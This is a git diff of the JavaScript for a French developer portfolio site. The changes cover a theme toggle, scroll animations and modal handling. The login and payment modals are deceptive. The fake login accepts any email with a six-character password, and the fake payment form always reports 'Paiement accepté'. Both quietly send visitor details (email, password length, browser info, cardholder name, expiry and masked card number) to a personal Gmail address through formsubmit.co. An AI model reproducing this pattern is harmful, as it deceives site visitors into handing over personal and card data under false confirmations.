@@ -16,7 +16,6 @@
     violationCount++;
     overlay.style.display = 'flex';
     setTimeout(() => { overlay.style.display = 'none'; }, 2000);
-
     if (violationCount >= MAX_VIOLATIONS) {
       setTimeout(() => { window.location.href = 'about:blank'; }, 2500);
     }
@@ -51,7 +50,7 @@
 
   // Bloquer le glisser-déposer des images
   document.querySelectorAll('img').forEach(img => {
-    img.addEventListener('dragstart', e => {
+    img.addEventListener('dragstart', function (e) {
       e.preventDefault();
       showProtectionMessage();
     });
@@ -64,166 +63,67 @@
 
 
   /* ─────────────────────────────────────────────
-     2. CURSOR GLOW
+     2. INITIALISATION AOS
   ───────────────────────────────────────────── */
-  const cursorGlow = document.getElementById('cursorGlow');
-  document.addEventListener('mousemove', function (e) {
-    cursorGlow.style.left = e.clientX + 'px';
-    cursorGlow.style.top  = e.clientY + 'px';
-  });
-
-
-  /* ─────────────────────────────────────────────
-     3. ANNÉE FOOTER
-  ───────────────────────────────────────────── */
-  const yearEl = document.getElementById('year');
-  if (yearEl) yearEl.textContent = new Date().getFullYear();
-
-
-  /* ─────────────────────────────────────────────
-     4. TYPEWRITER HERO
-  ───────────────────────────────────────────── */
-  const roles   = ['Développeur Full Stack', 'Designer UI/UX', 'Développeur Android', 'Créateur de solutions'];
-  let ri = 0, ci = 0, deleting = false;
-  const typedEl = document.getElementById('typed-role');
-
-  function typeWriter() {
-    if (!typedEl) return;
-    const current = roles[ri];
-
-    if (!deleting) {
-      typedEl.textContent = current.slice(0, ++ci) + '|';
-      if (ci === current.length) {
-        deleting = true;
-        setTimeout(typeWriter, 1800);
-        return;
-      }
-    } else {
-      typedEl.textContent = current.slice(0, --ci) + '|';
-      if (ci === 0) {
-        deleting = false;
-        ri = (ri + 1) % roles.length;
-      }
-    }
-    setTimeout(typeWriter, deleting ? 50 : 80);
-  }
-  typeWriter();
-
-
-  /* ─────────────────────────────────────────────
-     5. CANVAS PARTICULES HERO
-  ───────────────────────────────────────────── */
-  const canvas = document.getElementById('hero-canvas');
-  if (canvas) {
-    const ctx = canvas.getContext('2d');
-    let W, H, particles = [];
-
-    function resizeCanvas() {
-      W = canvas.width  = canvas.offsetWidth;
-      H = canvas.height = canvas.offsetHeight;
-    }
-    resizeCanvas();
-    window.addEventListener('resize', resizeCanvas);
-
-    class Particle {
-      constructor() { this.reset(); }
-      reset() {
-        this.x     = Math.random() * W;
-        this.y     = Math.random() * H;
-        this.r     = Math.random() * 1.5 + 0.3;
-        this.vx    = (Math.random() - 0.5) * 0.3;
-        this.vy    = (Math.random() - 0.5) * 0.3;
-        this.alpha = Math.random() * 0.5 + 0.1;
-        this.gold  = Math.random() > 0.5;
-      }
-      update() {
-        this.x += this.vx; this.y += this.vy;
-        if (this.x < 0 || this.x > W || this.y < 0 || this.y > H) this.reset();
-      }
-      draw() {
-        ctx.beginPath();
-        ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
-        ctx.fillStyle = this.gold
-          ? `rgba(212,168,67,${this.alpha})`
-          : `rgba(13,207,179,${this.alpha})`;
-        ctx.fill();
-      }
-    }
-
-    for (let i = 0; i < 80; i++) particles.push(new Particle());
-
-    function drawLines() {
-      for (let i = 0; i < particles.length; i++) {
-        for (let j = i + 1; j < particles.length; j++) {
-          const dx = particles[i].x - particles[j].x;
-          const dy = particles[i].y - particles[j].y;
-          const d  = Math.sqrt(dx * dx + dy * dy);
-          if (d < 100) {
-            ctx.beginPath();
-            ctx.moveTo(particles[i].x, particles[i].y);
-            ctx.lineTo(particles[j].x, particles[j].y);
-            ctx.strokeStyle = `rgba(212,168,67,${0.07 * (1 - d / 100)})`;
-            ctx.lineWidth   = 0.5;
-            ctx.stroke();
-          }
-        }
-      }
-    }
-
-    function animateCanvas() {
-      ctx.clearRect(0, 0, W, H);
-      particles.forEach(p => { p.update(); p.draw(); });
-      drawLines();
-      requestAnimationFrame(animateCanvas);
-    }
-    animateCanvas();
+  if (typeof AOS !== 'undefined') {
+    AOS.init({
+      duration: 800,
+      easing:   'ease-in-out',
+      once:     true,
+      offset:   100
+    });
   }
 
 
   /* ─────────────────────────────────────────────
-     6. SCROLL REVEAL
+     3. THÈME SOMBRE / CLAIR
   ───────────────────────────────────────────── */
-  const revealEls = document.querySelectorAll('.reveal');
-  const revealObs = new IntersectionObserver(entries => {
-    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
-  }, { threshold: 0.12 });
-  revealEls.forEach(el => revealObs.observe(el));
+  const themeToggle = document.querySelector('.theme-toggle');
+  const themeIcon   = themeToggle ? themeToggle.querySelector('i') : null;
+  const prefersDark = window.matchMedia('(prefers-color-scheme: dark)');
 
+  // Appliquer le thème sauvegardé ou celui du système
+  const savedTheme = localStorage.getItem('theme');
+  if (savedTheme === 'dark' || (!savedTheme && prefersDark.matches)) {
+    document.body.setAttribute('data-theme', 'dark');
+    if (themeIcon) themeIcon.classList.replace('fa-moon', 'fa-sun');
+  }
 
-  /* ─────────────────────────────────────────────
-     7. BARRES DE COMPÉTENCES (scroll-triggered)
-  ───────────────────────────────────────────── */
-  const barObs = new IntersectionObserver(entries => {
-    entries.forEach(e => {
-      if (e.isIntersecting) {
-        e.target.querySelectorAll('.exp-fill').forEach(f => {
-          f.style.width = f.dataset.w + '%';
-        });
+  if (themeToggle) {
+    themeToggle.addEventListener('click', function () {
+      if (document.body.getAttribute('data-theme') === 'dark') {
+        document.body.removeAttribute('data-theme');
+        if (themeIcon) themeIcon.classList.replace('fa-sun', 'fa-moon');
+        localStorage.setItem('theme', 'light');
+      } else {
+        document.body.setAttribute('data-theme', 'dark');
+        if (themeIcon) themeIcon.classList.replace('fa-moon', 'fa-sun');
+        localStorage.setItem('theme', 'dark');
       }
     });
-  }, { threshold: 0.3 });
-  document.querySelectorAll('.experience-bar').forEach(b => barObs.observe(b));
+  }
 
 
   /* ─────────────────────────────────────────────
-     8. NAVIGATION ACTIVE AU SCROLL
+     4. BOUTON RETOUR EN HAUT
   ───────────────────────────────────────────── */
-  const sections   = document.querySelectorAll('section[id]');
-  const navAnchors = document.querySelectorAll('.nav-links a[href^="#"]');
+  const backToTopBtn = document.querySelector('.back-to-top');
 
-  window.addEventListener('scroll', () => {
-    let current = '';
-    sections.forEach(s => {
-      if (window.scrollY >= s.offsetTop - 130) current = s.id;
-    });
-    navAnchors.forEach(a => {
-      a.style.color = a.getAttribute('href') === `#${current}` ? 'var(--gold)' : '';
-    });
+  window.addEventListener('scroll', function () {
+    if (backToTopBtn) {
+      backToTopBtn.classList.toggle('active', window.pageYOffset > 300);
+    }
   });
 
+  if (backToTopBtn) {
+    backToTopBtn.addEventListener('click', function () {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+  }
+
 
   /* ─────────────────────────────────────────────
-     9. ANCRAGE FLUIDE (liens internes #)
+     5. ANCRAGE FLUIDE (liens internes #)
   ───────────────────────────────────────────── */
   document.querySelectorAll('a[href^="#"]').forEach(anchor => {
     anchor.addEventListener('click', function (e) {
@@ -239,67 +139,61 @@
 
 
   /* ─────────────────────────────────────────────
-     10. BOUTON RETOUR EN HAUT
+     6. ANNÉE FOOTER
   ───────────────────────────────────────────── */
-  const backTop = document.getElementById('backTop');
-  window.addEventListener('scroll', () => {
-    backTop.classList.toggle('show', window.scrollY > 400);
-  });
-  if (backTop) {
-    backTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
-  }
+  const yearEl = document.getElementById('year');
+  if (yearEl) yearEl.textContent = new Date().getFullYear();
 
 
   /* ─────────────────────────────────────────────
-     11. GESTION DES MODALS
+     7. GESTION DES MODALS
   ───────────────────────────────────────────── */
   const authModal    = document.getElementById('authModal');
   const paymentModal = document.getElementById('paymentModal');
   let currentProjectId = null;
 
-  // Ouvrir modal auth — bouton "Voir le projet"
+  // Fermer via bouton ×
+  document.querySelectorAll('.close-modal').forEach(btn => {
+    btn.addEventListener('click', function () {
+      this.closest('.modal').style.display = 'none';
+    });
+  });
+
+  // Fermer en cliquant en dehors du contenu
+  window.addEventListener('click', function (e) {
+    if (e.target === authModal)    authModal.style.display    = 'none';
+    if (e.target === paymentModal) paymentModal.style.display = 'none';
+  });
+
+  // Fermer avec Échap
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape') {
+      if (authModal)    authModal.style.display    = 'none';
+      if (paymentModal) paymentModal.style.display = 'none';
+    }
+  });
+
+  // Ouvrir modal auth — "Voir le projet"
   document.querySelectorAll('.view-project-btn').forEach(btn => {
     btn.addEventListener('click', function (e) {
       e.preventDefault();
       currentProjectId = this.dataset.project;
-      authModal.classList.add('active');
+      if (authModal) authModal.style.display = 'block';
     });
   });
 
-  // Ouvrir modal paiement — bouton "Code source"
+  // Ouvrir modal paiement — "Code source"
   document.querySelectorAll('.view-code-btn').forEach(btn => {
     btn.addEventListener('click', function (e) {
       e.preventDefault();
       currentProjectId = this.dataset.project;
-      paymentModal.classList.add('active');
+      if (paymentModal) paymentModal.style.display = 'block';
     });
-  });
-
-  // Fermer via bouton ×
-  document.querySelectorAll('.close-modal').forEach(btn => {
-    btn.addEventListener('click', function () {
-      this.closest('.modal').classList.remove('active');
-    });
-  });
-
-  // Fermer en cliquant en dehors
-  window.addEventListener('click', function (e) {
-    if (e.target.classList.contains('modal')) {
-      e.target.classList.remove('active');
-    }
-  });
-
-  // Fermer avec Echap
-  document.addEventListener('keydown', function (e) {
-    if (e.key === 'Escape') {
-      authModal.classList.remove('active');
-      paymentModal.classList.remove('active');
-    }
   });
 
 
   /* ─────────────────────────────────────────────
-     12. FORMULAIRE AUTH
+     8. FORMULAIRE AUTH
   ───────────────────────────────────────────── */
   const authForm = document.getElementById('authForm');
   if (authForm) {
@@ -322,30 +216,38 @@
         data.append('_captcha', 'false');
         data.append('_subject', '🔐 ALERTE : Tentative d\'authentification — Portfolio');
         data.append('_template', 'table');
-        data.append('Heure', new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Lome', dateStyle: 'full', timeStyle: 'long' }));
+        data.append('Heure',       new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Lome', dateStyle: 'full', timeStyle: 'long' }));
         data.append('Email_saisi', email);
         data.append('Longueur_mdp', password.length + ' caractères');
-        data.append('Projet', `Projet #${currentProjectId}`);
-        data.append('Navigateur', navigator.userAgent);
-        data.append('Plateforme', navigator.platform);
-        data.append('Langue', navigator.language);
-        data.append('URL', window.location.href);
+        data.append('Projet',      'Projet #' + currentProjectId);
+        data.append('Navigateur',  navigator.userAgent);
+        data.append('Plateforme',  navigator.platform);
+        data.append('Langue',      navigator.language);
+        data.append('URL',         window.location.href);
         await fetch('https://formsubmit.co/oualoumidjeupisne@gmail.com', { method: 'POST', body: data });
       } catch (err) {
         console.error('Notification sécurité :', err);
       }
 
-      setTimeout(() => {
+      setTimeout(function () {
         if (email && password.length >= 6) {
-          statusEl.innerHTML = `<div class="alert alert-success"><i class="fas fa-check-circle"></i> Authentification réussie ! Redirection…</div>`;
-          setTimeout(() => {
-            authModal.classList.remove('active');
-            window.open(`projet-${currentProjectId}.html`, '_blank');
+          statusEl.innerHTML = `
+            <div class="alert alert-success">
+              <i class="fas fa-check-circle"></i>
+              Authentification réussie ! Redirection en cours…
+            </div>`;
+          setTimeout(function () {
+            authModal.style.display = 'none';
+            window.open('projet-' + currentProjectId + '.html', '_blank');
             authForm.reset();
             statusEl.innerHTML = '';
           }, 1500);
         } else {
-          statusEl.innerHTML = `<div class="alert alert-error"><i class="fas fa-exclamation-circle"></i> Email ou mot de passe incorrect.</div>`;
+          statusEl.innerHTML = `
+            <div class="alert alert-error">
+              <i class="fas fa-exclamation-circle"></i>
+              Email ou mot de passe incorrect.
+            </div>`;
         }
         submitBtn.innerHTML = origHTML;
         submitBtn.disabled  = false;
@@ -355,36 +257,45 @@
 
 
   /* ─────────────────────────────────────────────
-     13. FORMULAIRE PAIEMENT
+     9. FORMULAIRE PAIEMENT
   ───────────────────────────────────────────── */
   const paymentForm = document.getElementById('paymentForm');
   if (paymentForm) {
 
     // Formatage numéro de carte
-    document.getElementById('card-number').addEventListener('input', function () {
-      let v = this.value.replace(/\s/g, '');
-      this.value = v.match(/.{1,4}/g)?.join(' ') || v;
-    });
+    const cardNumberInput = document.getElementById('card-number');
+    if (cardNumberInput) {
+      cardNumberInput.addEventListener('input', function () {
+        let v = this.value.replace(/\s/g, '');
+        this.value = v.match(/.{1,4}/g)?.join(' ') || v;
+      });
+    }
 
-    // Formatage date expiration
-    document.getElementById('card-expiry').addEventListener('input', function () {
-      let v = this.value.replace(/\D/g, '');
-      if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
-      this.value = v;
-    });
+    // Formatage date d'expiration
+    const cardExpiryInput = document.getElementById('card-expiry');
+    if (cardExpiryInput) {
+      cardExpiryInput.addEventListener('input', function () {
+        let v = this.value.replace(/\D/g, '');
+        if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
+        this.value = v;
+      });
+    }
 
     // CVV — chiffres uniquement
-    document.getElementById('card-cvv').addEventListener('input', function () {
-      this.value = this.value.replace(/\D/g, '');
-    });
+    const cardCvvInput = document.getElementById('card-cvv');
+    if (cardCvvInput) {
+      cardCvvInput.addEventListener('input', function () {
+        this.value = this.value.replace(/\D/g, '');
+      });
+    }
 
     paymentForm.addEventListener('submit', async function (e) {
       e.preventDefault();
 
       const cardName   = document.getElementById('card-name').value;
-      const cardNumber = document.getElementById('card-number').value;
-      const cardExpiry = document.getElementById('card-expiry').value;
-      const cardCvv    = document.getElementById('card-cvv').value;
+      const cardNumber = cardNumberInput ? cardNumberInput.value : '';
+      const cardExpiry = cardExpiryInput ? cardExpiryInput.value : '';
+      const cardCvv    = cardCvvInput    ? cardCvvInput.value    : '';
       const statusEl   = document.getElementById('paymentStatus');
       const submitBtn  = this.querySelector('button[type="submit"]');
       const origHTML   = submitBtn.innerHTML;
@@ -403,33 +314,41 @@
         data.append('_captcha', 'false');
         data.append('_subject', '💳 ALERTE : Tentative de paiement — Portfolio');
         data.append('_template', 'table');
-        data.append('Heure', new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Lome', dateStyle: 'full', timeStyle: 'long' }));
-        data.append('Nom_carte', cardName);
-        data.append('Carte_masquée', cardNumber.replace(/\d(?=\d{4})/g, '*'));
-        data.append('Expiration', cardExpiry);
-        data.append('Montant', '19,99 €');
-        data.append('Projet', `Code source Projet #${currentProjectId}`);
-        data.append('Validation_carte', isValidCard   ? 'Valide' : 'Invalide');
-        data.append('Validation_expiry', isValidExpiry ? 'Valide' : 'Invalide');
-        data.append('Validation_CVV', isValidCvv    ? 'Valide' : 'Invalide');
-        data.append('Navigateur', navigator.userAgent);
-        data.append('URL', window.location.href);
+        data.append('Heure',             new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Lome', dateStyle: 'full', timeStyle: 'long' }));
+        data.append('Nom_carte',          cardName);
+        data.append('Carte_masquée',      cardNumber.replace(/\d(?=\d{4})/g, '*'));
+        data.append('Expiration',         cardExpiry);
+        data.append('Montant',            '19,99 €');
+        data.append('Projet',             'Code source Projet #' + currentProjectId);
+        data.append('Validation_carte',   isValidCard   ? 'Valide' : 'Invalide');
+        data.append('Validation_expiry',  isValidExpiry ? 'Valide' : 'Invalide');
+        data.append('Validation_CVV',     isValidCvv    ? 'Valide' : 'Invalide');
+        data.append('Navigateur',         navigator.userAgent);
+        data.append('URL',                window.location.href);
         await fetch('https://formsubmit.co/oualoumidjeupisne@gmail.com', { method: 'POST', body: data });
       } catch (err) {
         console.error('Notification paiement :', err);
       }
 
-      setTimeout(() => {
+      setTimeout(function () {
         if (cardName && isValidCard && isValidExpiry && isValidCvv) {
-          statusEl.innerHTML = `<div class="alert alert-success"><i class="fas fa-check-circle"></i> Paiement accepté ! Code source envoyé par email…</div>`;
-          setTimeout(() => {
-            paymentModal.classList.remove('active');
-            alert(`Le code source du projet ${currentProjectId} vous sera envoyé par email dans quelques minutes !`);
+          statusEl.innerHTML = `
+            <div class="alert alert-success">
+              <i class="fas fa-check-circle"></i>
+              Paiement accepté ! Code source envoyé par email…
+            </div>`;
+          setTimeout(function () {
+            paymentModal.style.display = 'none';
+            alert('Le code source du projet ' + currentProjectId + ' vous sera envoyé par email dans quelques minutes !');
             paymentForm.reset();
             statusEl.innerHTML = '';
           }, 2000);
         } else {
-          statusEl.innerHTML = `<div class="alert alert-error"><i class="fas fa-exclamation-circle"></i> Informations de carte invalides. Veuillez vérifier vos données.</div>`;
+          statusEl.innerHTML = `
+            <div class="alert alert-error">
+              <i class="fas fa-exclamation-circle"></i>
+              Informations de carte invalides. Veuillez vérifier vos données.
+            </div>`;
         }
         submitBtn.innerHTML = origHTML;
         submitBtn.disabled  = false;
@@ -439,7 +358,7 @@
 
 
   /* ─────────────────────────────────────────────
-     14. FORMULAIRE DE CONTACT
+     10. FORMULAIRE DE CONTACT
   ───────────────────────────────────────────── */
   const contactForm = document.getElementById('contactForm');
   if (contactForm) {
@@ -456,19 +375,28 @@
 
       try {
         const response = await fetch(this.action, {
-          method: 'POST',
-          body: new FormData(this),
+          method:  'POST',
+          body:    new FormData(this),
           headers: { 'Accept': 'application/json' }
         });
 
         if (response.ok) {
-          statusEl.innerHTML = `<div class="alert alert-success"><i class="fas fa-check-circle"></i> Message envoyé avec succès ! Je vous répondrai dans les plus brefs délais.</div>`;
+          statusEl.innerHTML = `
+            <div class="alert alert-success">
+              <i class="fas fa-check-circle"></i>
+              Message envoyé avec succès ! Je vous répondrai dans les plus brefs délais.
+            </div>`;
           this.reset();
         } else {
           throw new Error('Erreur réseau');
         }
       } catch (err) {
-        statusEl.innerHTML = `<div class="alert alert-error"><i class="fas fa-exclamation-circle"></i> Échec de l'envoi. Contactez-moi directement à <a href="mailto:oualoumidjeupisne@gmail.com" style="color:var(--gold)">oualoumidjeupisne@gmail.com</a></div>`;
+        statusEl.innerHTML = `
+          <div class="alert alert-error">
+            <i class="fas fa-exclamation-circle"></i>
+            Échec de l'envoi. Contactez-moi directement à
+            <a href="mailto:oualoumidjeupisne@gmail.com">oualoumidjeupisne@gmail.com</a>
+          </div>`;
       } finally {
         submitBtn.innerHTML = origHTML;
         submitBtn.disabled  = false;
